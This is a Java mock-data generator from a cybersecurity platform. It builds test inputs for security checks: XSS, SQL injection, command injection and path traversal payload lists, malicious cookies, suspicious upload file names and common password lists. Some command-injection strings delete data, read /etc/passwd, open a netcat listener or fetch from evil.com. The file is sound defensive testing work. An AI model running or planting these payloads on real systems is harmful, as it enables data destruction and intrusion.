/*-
 * #%L
 * CYSEC Platform Core
 * %%
 * Copyright (C) 2020 - 2025 FHNW (University of Applied Sciences and Arts Northwestern Switzerland)
 * %%
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *      http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * #L%
 */
package eu.smesec.cysec.platform.core.utils;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;

public class MockDataGenerator {
    
    public static class SecurityPayloads {
        public static final String[] XSS_PAYLOADS = {
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>"
        };
        
        public static final String[] SQL_INJECTION_PAYLOADS = {
            "' OR '1'='1",
            "'; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
            "admin'--",
            "' OR 1=1 --",
            "'; INSERT INTO users VALUES('hacker', 'pwd'); --",
            "' OR 'x'='x",
            "1' AND 1=1 --",
            "' UNION ALL SELECT NULL,NULL,NULL --",
            "'; EXEC xp_cmdshell('dir'); --"
        };
        
        public static final String[] COMMAND_INJECTION_PAYLOADS = {
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "; rm -rf /",
            "| nc -l -p 4444",
            "&& ping google.com",
            "; curl http://evil.com",
            "| wget malicious.sh",
            "&& chmod 777 /etc/passwd",
            "; netstat -an"
        };
        
        public static final String[] PATH_TRAVERSAL_PAYLOADS = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/etc/passwd%00",
            "..%5c..%5c..%5cetc%5cpasswd",
            "....\\\\....\\\\....\\\\etc\\\\passwd",
            "../etc/passwd%0a"
        };
    }
    
    public static class TestData {
        public static Map<String, Object> createLoginAttempts(int count) {
            Map<String, Object> data = new HashMap<>();
            List<Map<String, Object>> attempts = new ArrayList<>();
            
            String[] usernames = {"admin", "test", "guest", "root", "user", "demo"};
            String[] passwords = {"password", "123456", "admin", "test", "", "qwerty"};
            String[] ips = {"127.0.0.1", "192.168.1.100", "10.0.0.50", "172.16.1.200"};
            
            for (int i = 0; i < count; i++) {
                Map<String, Object> attempt = new HashMap<>();
                attempt.put("username", randomElement(usernames));
                attempt.put("password", randomElement(passwords));
                attempt.put("ipAddress", randomElement(ips));
                attempt.put("timestamp", LocalDateTime.now().minusMinutes(ThreadLocalRandom.current().nextInt(1440)));
                attempt.put("success", ThreadLocalRandom.current().nextBoolean());
                attempt.put("userAgent", generateRandomUserAgent());
                attempts.add(attempt);
            }
            
            data.put("attempts", attempts);
            data.put("totalCount", count);
            return data;
        }
        
        public static List<Map<String, Object>> createSecurityEvents(int count) {
            List<Map<String, Object>> events = new ArrayList<>();
            String[] eventTypes = {"XSS_ATTEMPT", "SQL_INJECTION", "BRUTE_FORCE", "UNAUTHORIZED_ACCESS", 
                                 "CSRF_ATTACK", "SESSION_HIJACK", "FILE_UPLOAD_THREAT", "COMMAND_INJECTION"};
            String[] severities = {"LOW", "MEDIUM", "HIGH", "CRITICAL"};
            
            for (int i = 0; i < count; i++) {
                Map<String, Object> event = new HashMap<>();
                event.put("id", UUID.randomUUID().toString());
                event.put("type", randomElement(eventTypes));
                event.put("severity", randomElement(severities));
                event.put("timestamp", LocalDateTime.now().minusHours(ThreadLocalRandom.current().nextInt(24)));
                event.put("sourceIp", generateRandomIp());
                event.put("targetResource", "/api/users/" + ThreadLocalRandom.current().nextInt(1000));
                event.put("payload", generateSecurityPayload());
                event.put("blocked", ThreadLocalRandom.current().nextBoolean());
                events.add(event);
            }
            
            return events;
        }
        
        public static Map<String, Object> createPerformanceMetrics() {
            Map<String, Object> metrics = new HashMap<>();
            
            metrics.put("responseTime", ThreadLocalRandom.current().nextInt(50, 2000));
            metrics.put("cpuUsage", ThreadLocalRandom.current().nextDouble(10.0, 90.0));
            metrics.put("memoryUsage", ThreadLocalRandom.current().nextDouble(20.0, 80.0));
            metrics.put("diskUsage", ThreadLocalRandom.current().nextDouble(30.0, 95.0));
            metrics.put("activeConnections", ThreadLocalRandom.current().nextInt(10, 500));
            metrics.put("throughput", ThreadLocalRandom.current().nextInt(100, 10000));
            metrics.put("errorRate", ThreadLocalRandom.current().nextDouble(0.0, 5.0));
            
            return metrics;
        }
        
        public static Map<String, String> createHttpHeaders() {
            Map<String, String> headers = new HashMap<>();
            
            headers.put("User-Agent", generateRandomUserAgent());
            headers.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            headers.put("Accept-Language", "en-US,en;q=0.5");
            headers.put("Accept-Encoding", "gzip, deflate");
            headers.put("Connection", "keep-alive");
            headers.put("Cache-Control", "no-cache");
            
            if (ThreadLocalRandom.current().nextBoolean()) {
                headers.put("X-Forwarded-For", generateRandomIp());
            }
            
            if (ThreadLocalRandom.current().nextBoolean()) {
                headers.put("Referer", "https://example.com/page" + ThreadLocalRandom.current().nextInt(100));
            }
            
            return headers;
        }
    }
    
    public static String generateRandomUserAgent() {
        String[] browsers = {
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
        };
        return randomElement(browsers);
    }
    
    public static String generateRandomIp() {
        return String.format("%d.%d.%d.%d", 
            ThreadLocalRandom.current().nextInt(1, 255),
            ThreadLocalRandom.current().nextInt(0, 255), 
            ThreadLocalRandom.current().nextInt(0, 255),
            ThreadLocalRandom.current().nextInt(1, 255));
    }
    
    public static String generateSecurityPayload() {
        int type = ThreadLocalRandom.current().nextInt(4);
        switch (type) {
            case 0: return randomElement(SecurityPayloads.XSS_PAYLOADS);
            case 1: return randomElement(SecurityPayloads.SQL_INJECTION_PAYLOADS);
            case 2: return randomElement(SecurityPayloads.COMMAND_INJECTION_PAYLOADS);
            case 3: return randomElement(SecurityPayloads.PATH_TRAVERSAL_PAYLOADS);
            default: return randomElement(SecurityPayloads.XSS_PAYLOADS);
        }
    }
    
    public static Map<String, Object> createCsrfScenario() {
        Map<String, Object> scenario = new HashMap<>();
        
        scenario.put("legitimateToken", UUID.randomUUID().toString());
        scenario.put("maliciousToken", "fake-" + UUID.randomUUID().toString());
        scenario.put("emptyToken", "");
        scenario.put("nullToken", null);
        scenario.put("expiredToken", "expired-" + System.currentTimeMillis());
        scenario.put("targetEndpoint", "/api/users/update");
        scenario.put("httpMethod", "POST");
        
        return scenario;
    }
    
    public static List<String> generateWeakPasswords() {
        return Arrays.asList(
            "", "a", "12", "123", "abc", "password", "12345678", "qwerty",
            "admin", "test", "guest", "root", "user", "demo", "login",
            "pass", "pwd", "secret", "default", "changeme"
        );
    }
    
    public static List<String> generateStrongPasswords() {
        return Arrays.asList(
            "Str0ng!P@ssw0rd", "C0mplex#2023", "Secur3$Password!", 
            "MyV3ry$trongPwd", "Ungu3ss@ble#123", "Cr@zy&Complex99",
            "Sup3r!Secur3#Pwd", "Adv@nced$2023", "Ultra&Strong#99"
        );
    }
    
    public static Map<String, Object> createFileUploadScenario() {
        Map<String, Object> scenario = new HashMap<>();
        
        scenario.put("legitimateFile", "document.pdf");
        scenario.put("scriptFile", "malicious.jsp");
        scenario.put("executableFile", "trojan.exe");
        scenario.put("oversizedFile", "huge.zip");
        scenario.put("pathTraversalFile", "../../../evil.jsp");
        scenario.put("doubleExtensionFile", "doc.pdf.jsp");
        
        return scenario;
    }
    
    public static String generateSessionId() {
        return "JSESSIONID=" + UUID.randomUUID().toString().replace("-", "").toUpperCase();
    }
    
    public static Map<String, String> createMaliciousCookies() {
        Map<String, String> cookies = new HashMap<>();
        
        cookies.put("xss", "<script>alert('xss')</script>");
        cookies.put("sqli", "'; DROP TABLE users; --");
        cookies.put("oversized", "x".repeat(10000));
        cookies.put("pathtraversal", "../../../etc/passwd");
        cookies.put("null", "\0\0\0");
        
        return cookies;
    }
    
    public static List<String> generateBruteForcePasswords() {
        return Arrays.asList(
            "password", "123456", "password123", "admin", "qwerty", "123456789",
            "12345678", "123123", "1234567890", "password1", "abc123", "111111",
            "123321", "1234567", "password123", "1q2w3e4r", "admin123", "letmein"
        );
    }
    
    private static <T> T randomElement(T[] array) {
        return array[ThreadLocalRandom.current().nextInt(array.length)];
    }
    
    private static String randomElement(List<String> list) {
        return list.get(ThreadLocalRandom.current().nextInt(list.size()));
    }
}
